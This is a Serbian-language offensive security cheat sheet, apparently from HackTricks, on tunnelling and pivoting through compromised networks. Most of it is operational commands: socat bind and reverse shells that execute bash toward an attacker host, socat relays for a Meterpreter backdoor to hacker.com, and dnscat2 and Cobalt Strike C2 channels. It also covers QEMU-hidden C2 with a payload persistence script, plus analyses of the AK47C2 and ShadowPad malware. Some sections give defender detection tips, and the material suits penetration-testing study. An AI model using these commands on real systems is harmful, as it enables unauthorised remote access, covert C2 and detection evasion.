# Tunelovanje i prosleđivanje portova

{{#include ../banners/hacktricks-training.md}}

## Nmap savet

> [!WARNING]
> **ICMP** i **SYN** skeniranja ne mogu da se tuneluju kroz socks proxy-je, zato moramo **onemogućiti otkrivanje pingom** (`-Pn`) i navesti **TCP skeniranja** (`-sT`) da bi ovo funkcionisalo.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafička veza (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Otvori novi Port na SSH Serveru --> drugi port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokalni port --> Kompromitovani host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokalni port --> Kompromitovani host (SSH) --> Bilo gde
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Ovo je korisno za dobijanje reverse shells sa internih hostova kroz DMZ do vašeg hosta:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Potreban vam je **root na oba uređaja** (pošto ćete kreirati nove interfejse), a sshd konfiguracija mora da dozvoli root prijavljivanje:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Omogućite prosleđivanje na strani servera
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Postavi novu rutu na strani klijenta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> Downgrade napad Terrapin iz 2023. godine može omogućiti napadaču između dve strane da menja početno SSH rukovanje i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Uverite se da su i klijent i server ažurirani (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili izričito onemogućite ranjive algoritme `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tunele.

## SSHUTTLE

Možete **tunelovati** sav **saobraćaj** do **podmreže** putem **ssh** veze kroz jedan host.\
Na primer, prosleđivanje celokupnog saobraćaja namenjenog mreži 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Povežite se privatnim ključem
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokalni port --> Kompromitovani host (aktivna sesija) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Drugi način:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Otvorite port na teamserveru koji osluškuje na svim interfejsima i koji se može koristiti za **usmeravanje saobraćaja kroz beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> U ovom slučaju, **port se otvara na beacon hostu**, a ne na Team Serveru, i saobraćaj se šalje na Team Server, a odatle na navedeni host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Napomena:

- Beacon's reverse port forward je dizajniran da **tuneluje saobraćaj do Team Server-a, a ne za prosleđivanje između pojedinačnih mašina**.
- Saobraćaj je **tunelovan unutar Beacon-ovog C2 saobraćaja**, uključujući P2P linkove.
- **Administratorske privilegije nisu potrebne** za kreiranje reverse port forward-a na visokim portovima.

### rPort2Port local

> [!WARNING]
> U ovom slučaju, **port se otvara na beacon hostu**, a ne na Team Server-u, i **saobraćaj se šalje Cobalt Strike klijentu** (ne Team Server-u), a zatim odatle na navedeni host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Potrebno je da otpremite web fajl za tunel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Možete ga preuzeti sa stranice sa izdanjima [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Potrebno je da koristite **istu verziju za client i server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Prosleđivanje portova
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Koristite istu verziju za agent i proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Povezivanje agenta i osluškivanje
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Pristup lokalnim portovima agenta
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Obrnuti tunel. Tunel se pokreće sa žrtve.\
socks4 proxy se kreira na 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kroz **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kroz socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kroz SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Možete zaobići **proxy bez autentifikacije** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Kreirajte sertifikate na obe strane: Client i Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Povežite lokalni SSH port (22) sa portom 443 napadačevog hosta
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

To je verzija PuTTY-ja za konzolu (opcije su veoma slične ssh klijentu).

Pošto će se ovaj binary izvršavati na žrtvi i predstavlja ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli da ostvarimo povratnu vezu. Zatim, da prosledimo port dostupan samo lokalno na port na našoj mašini:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Neophodno je da budete lokalni administrator (za bilo koji port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Potrebno je da imate **RDP pristup sistemu**.\
Preuzmite:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) funkciju Remote Desktop Service-a u Windows-u. DVC je zadužen za **tunneling paketa preko RDP konekcije**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na klijentskom računaru učitajte **`SocksOverRDP-Plugin.dll`** na sledeći način:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sada možemo da se **povežemo** sa **žrtvom** preko **RDP-a** koristeći **`mstsc.exe`**, i trebalo bi da dobijemo **obaveštenje** da je **SocksOverRDP plugin** omogućen i da će **osluškivati** na **127.0.0.1:1080**.

**Povežite se** preko **RDP-a** i otpremite i pokrenite binarni fajl `SocksOverRDP-Server.exe` na računaru žrtve:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sada potvrdite na svojoj mašini (napadaču) da port 1080 osluškuje:
```
netstat -antb | findstr 1080
```
Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da prosleđujete saobraćaj kroz taj port.**

## Proxify Windows GUI aplikacija

Možete podesiti da Windows GUI aplikacije pristupaju internetu kroz proxy koristeći [**Proxifier**](https://www.proxifier.com/).\
U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
U **Profile -> Proxification Rules** dodajte naziv programa koji treba proxify-ovati i konekcije ka IP adresama kroz koje želite da proxify-ujete saobraćaj.

## Zaobilaženje NTLM proxy-ja

Prethodno pomenuti alat: **Rpivot**\
**OpenVPN** takođe može da ga zaobiđe, podešavanjem ovih opcija u konfiguracionom fajlu:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Autentifikuje se na proxy i lokalno otvara port koji prosleđuje saobraćaj ka eksternom servisu koji navedete. Zatim možete koristiti alat po izboru kroz ovaj port.\
Na primer, prosledite port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sada, ako na primer podesite da **SSH** servis na žrtvi sluša na portu 443, možete da se povežete na njega preko porta 2222 na napadaču.\
Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, dok napadač sluša na portu 2222.

## YARP

Reverse proxy koji je napravio Microsoft. Možete ga pronaći ovde: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root je potreban na oba sistema za kreiranje tun adapters i tunelovanje podataka između njih pomoću DNS upita.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunel će biti veoma spor. Možete kreirati kompresovanu SSH vezu kroz ovaj tunel koristeći:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Preuzmite ga ovde**](https://github.com/iagox86/dnscat2)**.**

Uspostavlja C\&C kanal kroz DNS. Nisu mu potrebne root privilegije.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **U PowerShell-u**

Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) da pokrenete dnscat2 klijent u powershell-u:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Prosleđivanje portova pomoću dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Promena proxychains DNS-a

Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **defaultu**, **DNS** server koji proxychains koristi je **4.2.2.2** (hardkodovan). Da biste ga promenili, izmenite fajl: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP adresu **domain controller-a**.

## Tuneli u Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor je kreirao **dual-channel C2 ("AK47C2")** koji zloupotrebljava *samo* odlazni **DNS** i **plain HTTP POST** saobraćaj – dva protokola koji se retko blokiraju na corporate mrežama.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Generiše nasumični 5-karakterni SessionID (npr. `H4T14`).
• Dodaje `1` za *task requests* ili `2` za *results* na početak i konkatenira različita polja (flags, SessionID, computer name).
• Svako polje je **XOR-enkriptovano ASCII ključem `VHBD@H`**, hex-encoded i povezano tačkama – na kraju se dodaje domain kojim attacker upravlja:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Zahtevi koriste `DnsQuery()` za **TXT** (i fallback **MG**) records.
• Kada response premaši 0xFF bajtova, backdoor **fragmentira** podatke u delove od 63 bajta i ubacuje markere:
`s<SessionID>t<TOTAL>p<POS>` kako bi C2 server mogao da ih poređa.

2. **HTTP mode (AK47HTTP)**
• Formira JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Ceo blob se XOR-uje ključem `VHBD@H` → hex → šalje kao telo **`POST /`** zahteva sa headerom `Content-Type: text/plain`.
• Reply prati isto encoding pravilo, a `cmd` polje se izvršava pomoću `cmd.exe /c <command> 2>&1`.

Blue Team beleške
• Tražite neuobičajene **TXT queries** čiji je prvi label dug hexadecimal string i koji se uvek završavaju istim retkim domain-om.
• Konstantni XOR ključ praćen ASCII-hex vrednošću lako se detektuje pomoću YARA: `6?56484244?484` (`VHBD@H` u hex formatu).
• Za HTTP, označite text/plain POST bodies koji sadrže isključivo hex i imaju paran broj bajtova.

{{#note}}
Ceo kanal se uklapa u **standardne RFC-compliant queries** i svaki sub-domain label održava ispod 63 bajta, što ga čini stealthy u većini DNS logova.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root je potreban na oba sistema da bi se kreirali tun adapteri i tunelovali podaci između njih pomoću ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Preuzmite ga ovde**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **je alat za izlaganje rešenja internetu pomoću jedne komandne linije.**\
_URI za izlaganje izgledaju ovako:_ **UID.ngrok.io**

### Instalacija

- Kreirajte nalog: https://ngrok.com/signup
- Preuzimanje klijenta:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Osnovne upotrebe

**Dokumentacija:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Moguće je dodati i autentifikaciju i TLS, ako je potrebno._

#### Tunelovanje TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Izlaganje fajlova putem HTTP-a
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP poziva

_Korisno za XSS,SSRF,SSTI ..._\
Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunelovanje interne HTTP usluge
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Jednostavan primer konfiguracije ngrok.yaml

Otvara 3 tunela:

- 2 TCP
- 1 HTTP sa izlaganjem statičkih fajlova iz /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare-ov `cloudflared` daemon može da kreira izlazne tunele koji izlažu **lokalne TCP/UDP servise** bez potrebe za ulaznim firewall pravilima, koristeći Cloudflare edge kao rendez-vous tačku. Ovo je veoma korisno kada egress firewall dozvoljava samo HTTPS saobraćaj, ali su ulazne konekcije blokirane.

### Brzi tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Trajni tuneli pomoću DNS-a
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Pokrenite konektor:
```bash
cloudflared tunnel run mytunnel
```
Pošto sav saobraćaj napušta host **outbound preko porta 443**, Cloudflared tuneli predstavljaju jednostavan način za zaobilaženje ingress ACL-ova ili NAT granica. Imajte na umu da se binary obično pokreće sa povišenim privilegijama – kada je moguće, koristite kontejnere ili opciju `--user`.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) je aktivno održavan Go reverse-proxy koji podržava **TCP, UDP, HTTP/S, SOCKS i P2P NAT-hole-punching**. Počev od **v0.53.0 (maj 2024.)**, može da radi kao **SSH Tunnel Gateway**, tako da target host može da uspostavi reverse tunnel koristeći samo standardni OpenSSH client – nije potreban dodatni binary.

### Klasični reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Korišćenje novog SSH gateway-a (bez frpc binarne datoteke)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Prethodna komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez deployovanja dodatnih alata – idealno za living-off-the-land pivoting.

## Skriveni VM-based tuneli sa QEMU

QEMU-ovo user-mode umrežavanje (`-netdev user`) podržava opciju pod nazivom `hostfwd`, koja **vezuje TCP/UDP port na *hostu* i prosleđuje ga u *guest***. Kada guest pokreće puni SSH daemon, `hostfwd` pravilo vam daje privremeni SSH jump box koji se u potpunosti nalazi unutar ephemeral VM-a – savršeno za skrivanje C2 saobraćaja od EDR-a, jer sva maliciozna aktivnost i fajlovi ostaju na virtuelnom disku.<sup>[[1]](#references)</sup>

### Brzi one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Gornja komanda pokreće **Tiny Core Linux** image (`tc.qcow2`) u RAM-u.  
• Port **2222/tcp** na Windows hostu transparentno se prosleđuje na **22/tcp** unutar guest-a.  
• Iz ugla napadača, cilj jednostavno izlaže port 2222; svim paketima koji do njega stignu upravlja SSH server pokrenut u VM-u.

### Neupadljivo pokretanje kroz VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Pokretanje skripte pomoću `cscript.exe //B update.vbs` održava prozor skrivenim.

### Persistence unutar guest-a

Pošto je Tiny Core stateless, napadači obično:

1. Smeste payload u `/opt/123.out`
2. Dodaju u `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Dodaju `home/tc` i `opt` u `/opt/filetool.lst` kako bi payload bio upakovan u `mydata.tgz` pri gašenju.

### Zašto ovo zaobilazi detekciju

• Samo dva unsigned executable-a (`qemu-system-*.exe`) upisuju podatke na disk; ne instaliraju se driver-i ni servisi.
• Security proizvodi na hostu vide **benign loopback saobraćaj** (stvarni C2 se završava unutar VM-a).
• Memory scanner-i nikada ne analiziraju prostor procesa sa malicious sadržajem, jer se on nalazi u drugom OS-u.

### Saveti za Defender

• Upozorite na **neočekivane QEMU/VirtualBox/KVM binarne datoteke** u putanjama u koje korisnici mogu da upisuju.
• Blokirajte outbound connections koje potiču od `qemu-system*.exe`.
• Tražite retke listening portove (2222, 10022, …) koji se bind-uju neposredno nakon pokretanja QEMU-a.

## IIS/HTTP.sys relay nodes preko `HttpAddUrl` (ShadowPad)

ShadowPad IIS module grupe Ink Dragon pretvara svaki kompromitovani perimeter web server u višestruku **backdoor + relay** komponentu tako što covert URL prefixes direktno bind-uje na HTTP.sys sloju:<sup>[[3]](#references)</sup>

* **Config defaults** – ako JSON config modula izostavi vrednosti, on se vraća na uverljive IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Na taj način IIS odgovara na benign saobraćaj uz ispravan branding.
* **Wildcard interception** – operatori prosleđuju listu URL prefixes odvojenu tačkama-zarezima (wildcards u host + path delu). Module poziva `HttpAddUrl` za svaki unos, pa HTTP.sys usmerava odgovarajuće requests ka malicious handler-u *pre nego što request stigne do IIS modules*.
* **Encrypted first packet** – prva dva bajta request body-ja sadrže seed za prilagođeni 32-bitni PRNG. Svaki naredni bajt se XOR-uje sa generisanim keystream-om pre protocol parsing-a:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module održava dve liste: “servers” (upstream nodes) i “clients” (downstream implants). Entries se uklanjaju ako heartbeat ne stigne u roku od približno 30 sekundi. Kada obe liste nisu prazne, on uparuje prvi healthy server sa prvim healthy client-om i jednostavno prosleđuje bajtove između njihovih socket-a dok jedna strana ne zatvori vezu.
* **Debug telemetry** – opciono logging beleži source IP, destination IP i ukupan broj prosleđenih bajtova za svako uparivanje. Istražitelji su koristili te breadcrumbs za rekonstrukciju ShadowPad mesh-a koji je obuhvatao više žrtava.

---

## Ostali alati koje treba proveriti

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Reference

- [1] [Skrivanje u senkama: covert tunnels putem QEMU virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
